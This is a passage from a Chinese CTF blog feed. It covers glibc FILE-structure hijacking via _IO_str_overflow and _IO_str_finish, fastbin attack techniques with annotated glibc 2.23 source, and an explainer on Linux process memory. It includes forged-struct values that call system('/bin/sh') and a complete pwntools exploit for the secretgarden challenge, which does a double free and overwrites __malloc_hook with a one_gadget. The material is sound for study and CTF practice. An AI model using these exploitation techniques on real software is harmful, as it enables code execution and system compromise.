class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class="comment">// should in </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// pass</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> *new_buf;</span><br><span class="line">      <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)<span class="comment">//pass 一般会通过</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class="comment">//target [fp+0xe0]</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><p>利用以下代码来劫持程序流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new_buf = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure><p>几个条件bypass：<br>1.fp-&gt;_flags &amp; _IO_NO_WRITES为假<br>2.(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))<br>3.fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假<br>4.2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数<br>5.new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向/bin/sh字符串对应的地址<br>6.fp+0xe0指向system地址<br>构造</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0</span></span><br><span class="line">_IO_write_base = <span class="number">0</span></span><br><span class="line">_IO_write_ptr = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> +<span class="number">1</span></span><br><span class="line">_IO_buf_end = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> </span><br><span class="line"></span><br><span class="line">_freeres_list = <span class="number">0x2</span></span><br><span class="line">_freeres_buf = <span class="number">0x3</span></span><br><span class="line">_mode = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">vtable = _IO_str_jumps - <span class="number">0x18</span></span><br></pre></td></tr></table></figure><h3 id="finish"><a href="#finish" class="headerlink" title="finish"></a>finish</h3><p>原理与overflow类似</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class="comment">//[fp+0xe8]</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>几个条件 bypass：<br>1._IO_buf_base 不为空<br>2._flags &amp; _IO_USER_BUF(0x01) 为假<br>构造：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_flags = (binsh_in_libc + <span class="number">0x10</span>) &amp; ~<span class="number">1</span></span><br><span class="line">_IO_buf_base = binsh_addr</span><br><span class="line"></span><br><span class="line">_freeres_list = <span class="number">0x2</span></span><br><span class="line">_freeres_buf = <span class="number">0x3</span></span><br><span class="line">_mode = <span class="number">-1</span></span><br><span class="line">vtable = _IO_str_finish - <span class="number">0x18</span></span><br><span class="line">fp+<span class="number">0xe8</span> -&gt; system_addr</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn学习思维导图参考</title>
    <link href="/2021/06/19/pwn%E5%AD%A6%E4%B9%A0%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E5%8F%82%E8%80%83/"/>
    <url>/2021/06/19/pwn%E5%AD%A6%E4%B9%A0%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E5%8F%82%E8%80%83/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/06/19/pwn%E5%AD%A6%E4%B9%A0%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E5%8F%82%E8%80%83/1.jpg" alt="1.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Fastbin Attack</title>
    <link href="/2021/06/19/fastbin-attack/"/>
    <url>/2021/06/19/fastbin-attack/</url>
    
    <content type="html"><![CDATA[<p>要了解fastbin attack，首先得了解fastbin机制。由于libc2.26后加入了tcache机制，我们这里就分析glibc 2.23.<br>下面代码选自glibc2.23</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  size = chunksize (p);    <span class="comment">//获取p的size</span></span><br><span class="line">  check_inuse_chunk(av, p);<span class="comment">//检查p的物理相邻的下一个堆块的inuse位是否置1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//检查p的大小是否小于global_max_fast</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line">      <span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">          <span class="comment">//检查p物理相邻的堆块是否是top chunk</span></span><br><span class="line">          &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">      <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      ) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//检查p的物理相邻下个堆块是否存在,且大小是否满足最小和最大要求</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">       || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        &#123;.......&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对chunk的data块通过memset赋值，但是默认情况下是不进行操作    </span></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">    <span class="comment">//设置 malloc_state的flag</span></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取p对应大小的fastbinY的索引</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    <span class="comment">//fb指向对应大小的fastbinY的地址</span></span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    <span class="comment">// old为 对应大小的fastbinY的fd值，也就是第一个对块的地址</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">       <span class="comment">// Check that the top of the bin is not the record we are going to add</span></span><br><span class="line">         <span class="comment">//检查 fastbin中对应的bin的第一项 是否 等于 p (新加入的堆块)</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">          errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">          <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">//获取 fastbin中对应的bin的第一项的索引。</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">          old_idx = fastbin_index(chunksize(old));</span><br><span class="line">          <span class="comment">//让  p 的fd指向 顶部的fastbin块</span></span><br><span class="line">        p-&gt;fd = old2 = old;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line">    <span class="comment">//catomic_compare_and_exchange_val_rel 功能是 如果*fb等于old2，则将*fb存储为p，返回old2；</span></span><br><span class="line">    <span class="comment">// *fb=p 也就是 让对应fastbin的fd指向 p(新加入的堆块)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查fastbin中对应的bin的第一项的大小是否与p(要添加的块)的大小相同。</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到fastbin只是检查了fastbin第一个chunk是否与新加入的chunk相同。所以我们可以使用free(0) free(1) free(0)的方式来达到double free。之后还检查大小满足要求，通过size算出fastbin_index然后再比对。如果对应的fastbinY大小为0x70,64位的话size可以在0~0xF之间浮动，也就是说size为0x70-0x7f都会被认为是合法的。32位同理，在0-0x7之间浮动。</p><p><strong>利用前提：</strong><br>1、能创建fastbin类型的chunk<br>2、存在堆溢出、use-after-free等能控制chunk内容的漏洞<br>如果细分的话，可以做以下的分类：<br>3、fastbin double free<br>即利用double free漏洞构造chunk如下图所示<br><img src="/2021/06/19/fastbin-attack/1.jpg" alt="1.jpg"><br>我们首先申请回chunk1然后修改其fd值指向一个fake_chunk，这里的chunk要保证size域合法，我们再次申请3次同样的chunk,就会依次拿到chunk2，chunk1，fake_chunk。我们只要在关键位置伪造fake_chunk就可以了。例如在malloc_hook左右伪造fake_chunk，然后修改malloc_hook的值为one_gadget就可以在调用malloc时get_shell。</p><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><p>同fastbin double free利用手法类似，只不过只需要free依次，然后修改FD指针指向fake_chunk。</p><h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><p>该技术的核心在于目标位置处伪造fastbin chunk，并将其释放，再申请回来，从而达到分配指定地址的chunk的目的。<br>    ### 可以free你指定位置的fake_chunk<br>    ### 要想构造fastbin fake chunk，并且将其释放时，可以将其放入到对应的fastbin链表当中，需要绕过一些必要的检测，即<br>        ##### fake chunk的ISMMAP位不能为1，因为free时，如果是mmap的chunk，就会单独处理。<br>        ##### fake chunk地址需要对齐，32位8字节对齐，64位16字节对齐<br>          ##### fake chunk的size大小需要满足fastbin的需求<br>          ##### fake chunk的next chunk的大小合理</p><h1 id="alloc-to-stack"><a href="#alloc-to-stack" class="headerlink" title="alloc to stack"></a>alloc to stack</h1><p>该技术的核心点在于劫持fastbin链表中的chunk的fd指针，把fd指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p><h1 id="arbitrary-alloc"><a href="#arbitrary-alloc" class="headerlink" title="arbitrary alloc"></a>arbitrary alloc</h1><p>arbitrary alloc 其实与alloc to stack是完全相同的，唯一的区别就是分配的目标不是在栈中。我们可以把chunk分配到任意可写的内存中，比如bss、heap、data、stack等等。</p><h1 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h1><p>以上是fastbin attack的集中方法，总结起来就是3步：<br>①伪造合理的chunk<br>②使得fd指向fake_chunk，或者free fake_chunk。使得fake_chunk加入到fastbin中<br>③分配得到fake_chunk，进行后续利用</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>hitcontraining_secretgarden，libc为2.23<br>首先检查一下保护<br><img src="/2021/06/19/fastbin-attack/2.jpg" alt="2.jpg"><br>main函数，有增删查，没有改<br><img src="/2021/06/19/fastbin-attack/3.jpg" alt="3.jpg"><br>漏洞点,del函数free的时候指针没有清零。并且free前没有检查flowerlist[i][0]的值是否为1<br><img src="/2021/06/19/fastbin-attack/4.jpg" alt="4.jpg"><br>其他都是常规操作</p><p>程序留有后门，我们也可以劫持函数的got来实现调用后门。但是我们这里使用的是劫持__malloc_hook，由于one_gadget不能用，我们通过__libc_realloc来改变栈环境，使得one_gadget条件成立。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./secretgarden&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">length,name,color</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name :&#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;flower :&#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;flower :&#x27;</span>,color)<span class="comment">#0x17</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;garden:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#----------------leak libc ---------------#</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x80</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">0x80</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#将其置入unsorted bin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;E&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#2</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;EEEEEEEE&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base: &#x27;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#-------------- double free ---------------#</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>) <span class="comment">#fastbinY(0x70) -&gt; 3 -&gt; 4 -&gt;3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------fastbin attack --------------#</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>),<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(libc_base+libc.symbols[<span class="string">&#x27;__libc_realloc&#x27;</span>]+<span class="number">8</span>),<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux动态内存管理机制</title>
    <link href="/2021/06/19/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/"/>
    <url>/2021/06/19/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="进程与内存"><a href="#进程与内存" class="headerlink" title="进程与内存"></a>进程与内存</h1><h3 id="1、进程如何使用内存"><a href="#1、进程如何使用内存" class="headerlink" title="1、进程如何使用内存"></a>1、进程如何使用内存</h3><p>毫无疑问，所有进程（执行的程序）都必须占有一定数量的内存，它或是用来存放从磁盘载入的程序代码，或是存取自用户输入的数据等等。不过进程对这些内存的管理方式因为内存用途不一而不尽相同，有些内存是事先静态分配和统一回收的，而有些却是需要动态分配和回收的。</p><p>对于任何一个普通进程来讲，它都会涉及到5种不同的数据段。稍有些编程知识的朋友都能想到这几个数据段中包含有“程序代码段”、“程序数据段”、“程序堆栈段等”。不错，这几个数据段都在其中，但除了以上几种数据段之外，进程还另外包含两种数据段。</p><p>代码段：代码段是用来存放可执行文件的操作指令，也就是说它是可执行程序在内存中的镜像。代码段需要防止在运行时被非法修改，所以只允许读取操作，而不允许写入操作–它是不可写的。</p><p>数据段：数据段用来存放可执行文件中已初始化全局变量，换句话说就是存放程序静态分配的变量和全局变量。</p><p>BSS段：BSS段包含了程序汇总未初始化的全局变量，在内存中bss全部置零。</p><p>堆段：堆时用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程用malloc等函数分配内存时，新分配的内存就被添加到堆上（堆被扩张）；当利用free等函数释放内存，被释放的内存从堆中被剔除（堆被缩减）</p><p>栈：栈是用户存放程序临时创建的局部变量，也就是说我们函数括弧中定义的变量（但不包括static声明的变量,static意味着在数据段中存放变量）。除此之外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈中后进先出特点，所以栈特别方便用来保存/恢复调用现场。从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。</p><h3 id="2、进程如何组织这些区域？"><a href="#2、进程如何组织这些区域？" class="headerlink" title="2、进程如何组织这些区域？"></a>2、进程如何组织这些区域？</h3><p>上述几种内存区域中数据段、BSS和堆通常是被连续存储的–内存位置上是连续的，而代码段和栈往往被独立存放。有趣的是，堆和栈两个区域关系很暧昧，他们一个向下长，一个向上长，但你不必担心他们会碰头，因为他们之间间隔很大。</p><p>进入操作系统内核看看，进程对内存具体是如何进行分配和管理的。<br>从用户向内核看，所使用的内存表象形式会依次经历“逻辑地址”–“线性地址”–“物理地址”几种形式。逻辑地址经段机制转化成线性地址；线性地址经过页机制转化为物理地址。（但是我们要知道Linux虽然保留了段机制，但是将所有程序的段地址都定死为0-4G，所以虽然逻辑地址和线性地址是两种不同的地址空间，但在linux中逻辑地址就等于线性地址）沿着这条线索，我们所研究的主要问题也就集中在下面几个问题。<br>1、进程地址空间如何管理？<br>2、进程地址如何映射到物理内存？<br>3、物理内存如何被管理？</p><h1 id="进程内存空间"><a href="#进程内存空间" class="headerlink" title="进程内存空间"></a>进程内存空间</h1><p>linux操作系统曹勇虚拟内存管理技术，使得每个进程都有各自互不干涉的进程地址空间。该空间是块大小为4G的线性虚拟空间，用户所看到和接触到的都是该虚拟地址，无法看到实际的物理内存地址。利用这种虚拟地址不但能起到保护操作系统的效果（用户不能直接访问物理内存），而且更重要的是，用户程序可使用比实际物理内存更大的地址空间。</p><p>在讨论进程空间细节前，这里先要澄清下面介个问题：</p><p>一、4G的进程地址空间被认为的分为两个部分–用户空间与内核空间。用户空间从0到3G（0xC0000000）,内核空间占据3G到4G。用户进程通常情况下只能访问用户空间的虚拟地址，不能访问内核空间虚拟地址。只有用户进程进行系统调用（代表用户进程在内核态执行）等时刻才可以访问到内核空间。</p><p>二、用户空间对应进程，每当进程切换，用户空间就会跟着变化；而内核空间是由内核负责映射，它并不会跟着进程改变，是固定的。内核空间地址有着自己对应的页表（init_mm.pgd），用户进程各有不同的页表。</p><p>三、每个进程的用户空间都是完全独立、互不相干的。不信的话，你可以把上面的程序同时运行10次，你会看到10个进程占用的线性地址一模一样。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>堆溢出利用之Fastbin</title>
    <link href="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/"/>
    <url>/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/</url>
    
